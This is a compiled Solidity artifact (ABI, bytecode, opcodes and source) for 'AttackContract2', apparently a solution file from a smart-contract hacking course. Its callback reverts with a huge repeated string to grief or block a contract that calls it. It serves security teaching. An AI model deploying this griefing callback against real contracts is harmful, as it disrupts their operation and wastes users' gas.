{
  "abi": [
    {
      "inputs": [],
      "name": "allowExecution",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "beforeExecution",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "flipSwitch",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "608060405234801561001057600080fd5b506102bc806100206000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c80634f0c8fdf146100465780636e7856351461005f57806391a4188814610067575b600080fd5b61005d6000805460ff19811660ff90911615179055565b005b61005d610088565b6000546100749060ff1681565b604051901515815260200160405180910390f35b60005460ff161561009557565b60006040518060e0016040528060c081526020016101c760c09139905060005b60098110156100f55781826040516020016100d192919061013d565b604051602081830303815290604052915080806100ed9061016c565b9150506100b5565b508060405162461bcd60e51b81526004016101109190610193565b60405180910390fd5b60005b8381101561013457818101518382015260200161011c565b50506000910152565b6000835161014f818460208801610119565b835190830190610163818360208801610119565b01949350505050565b60006001820161018c57634e487b7160e01b600052601160045260246000fd5b5060010190565b60208152600082518060208401526101b2816040850160208701610119565b601f01601f1916919091016040019291505056fe676173676173676173676173676167736761736761736761736761736761736761736761736761736761736761677367617367617367617367617367617367617367617367617367617367616773676173676173676173676173676173676173676173676173676173676167736761736761736761736761736761736761736761736761736761736761677367617367617367617367617367617367617367617367617367617367616773676173676173676173676173676173676173676173a2646970667358221220d560a2bf147bf83220d18c19fe98e1e63de167df28a00727ac84bf661703ecae64736f6c63430008130033",
  "bytecodeSha1": "c53d50f5629fe4daf91b1216d6ee9d8436fafd80",
  "compiler": {
    "evm_version": "istanbul",
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "version": "0.8.19+commit.7dd6d404"
  },
  "contractName": "AttackContract2",
  "language": "Solidity",
  "natspec": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4F0C8FDF EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x6E785635 EQ PUSH2 0x5F JUMPI DUP1 PUSH4 0x91A41888 EQ PUSH2 0x67 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x5D PUSH1 0x0 DUP1 SLOAD PUSH1 0xFF NOT DUP2 AND PUSH1 0xFF SWAP1 SWAP2 AND ISZERO OR SWAP1 SSTORE JUMP JUMPDEST STOP JUMPDEST PUSH2 0x5D PUSH2 0x88 JUMP JUMPDEST PUSH1 0x0 SLOAD PUSH2 0x74 SWAP1 PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x40 MLOAD SWAP1 ISZERO ISZERO DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD PUSH1 0xFF AND ISZERO PUSH2 0x95 JUMPI JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 PUSH1 0xE0 ADD PUSH1 0x40 MSTORE DUP1 PUSH1 0xC0 DUP2 MSTORE PUSH1 0x20 ADD PUSH2 0x1C7 PUSH1 0xC0 SWAP2 CODECOPY SWAP1 POP PUSH1 0x0 JUMPDEST PUSH1 0x9 DUP2 LT ISZERO PUSH2 0xF5 JUMPI DUP2 DUP3 PUSH1 0x40 MLOAD PUSH1 0x20 ADD PUSH2 0xD1 SWAP3 SWAP2 SWAP1 PUSH2 0x13D JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE SWAP2 POP DUP1 DUP1 PUSH2 0xED SWAP1 PUSH2 0x16C JUMP JUMPDEST SWAP2 POP POP PUSH2 0xB5 JUMP JUMPDEST POP DUP1 PUSH1 0x40 MLOAD PUSH3 0x461BCD PUSH1 0xE5 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x110 SWAP2 SWAP1 PUSH2 0x193 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x134 JUMPI DUP2 DUP2 ADD MLOAD DUP4 DUP3 ADD MSTORE PUSH1 0x20 ADD PUSH2 0x11C JUMP JUMPDEST POP POP PUSH1 0x0 SWAP2 ADD MSTORE JUMP JUMPDEST PUSH1 0x0 DUP4 MLOAD PUSH2 0x14F DUP2 DUP5 PUSH1 0x20 DUP9 ADD PUSH2 0x119 JUMP JUMPDEST DUP4 MLOAD SWAP1 DUP4 ADD SWAP1 PUSH2 0x163 DUP2 DUP4 PUSH1 0x20 DUP9 ADD PUSH2 0x119 JUMP JUMPDEST ADD SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 DUP3 ADD PUSH2 0x18C JUMPI PUSH4 0x4E487B71 PUSH1 0xE0 SHL PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST POP PUSH1 0x1 ADD SWAP1 JUMP JUMPDEST PUSH1 0x20 DUP2 MSTORE PUSH1 0x0 DUP3 MLOAD DUP1 PUSH1 0x20 DUP5 ADD MSTORE PUSH2 0x1B2 DUP2 PUSH1 0x40 DUP6 ADD PUSH1 0x20 DUP8 ADD PUSH2 0x119 JUMP JUMPDEST PUSH1 0x1F ADD PUSH1 0x1F NOT AND SWAP2 SWAP1 SWAP2 ADD PUSH1 0x40 ADD SWAP3 SWAP2 POP POP JUMP INVALID PUSH8 0x6173676173676173 PUSH8 0x6173676167736761 PUSH20 0x6761736761736761736761736761736761736761 PUSH20 0x6761736761677367617367617367617367617367 PUSH2 0x7367 PUSH2 0x7367 PUSH2 0x7367 PUSH2 0x7367 PUSH2 0x7367 PUSH2 0x6773 PUSH8 0x6173676173676173 PUSH8 0x6173676173676173 PUSH8 0x6173676173676173 PUSH8 0x6167736761736761 PUSH20 0x6761736761736761736761736761736761736761 PUSH20 0x6761677367617367617367617367617367617367 PUSH2 0x7367 PUSH2 0x7367 PUSH2 0x7367 PUSH2 0x7367 PUSH2 0x6773 PUSH8 0x6173676173676173 PUSH8 0x6173676173676173 PUSH8 0x6173A26469706673 PC 0x22 SLT KECCAK256 0xD5 PUSH1 0xA2 0xBF EQ PUSH28 0xF83220D18C19FE98E1E63DE167DF28A00727AC84BF661703ECAE6473 PUSH16 0x6C634300081300330000000000000000 ",
  "sha1": "d71923aedb38d9aebc10d3f095b76df2cf9103c0",
  "source": "// SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE\n// https://smartcontractshacking.com/#copyright-policy\npragma solidity ^0.8.13;\n\nimport \"../../interfaces/ICallbackContract.sol\";\n\ncontract AttackContract2 {\n    bool public allowExecution;\n\n    function flipSwitch() public {\n        allowExecution = !allowExecution;\n    }\n\n    function beforeExecution() external {\n        if (allowExecution) return;\n\n        string\n            memory gas = \"gasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgas\";\n\n        for (uint i; i < 9; i++) {\n            gas = string.concat(gas, gas);\n        }\n\n        revert(gas);\n    }\n}\n",
  "sourcePath": "contracts/solution/AttackContractSolved.sol",
  "type": "contract"
}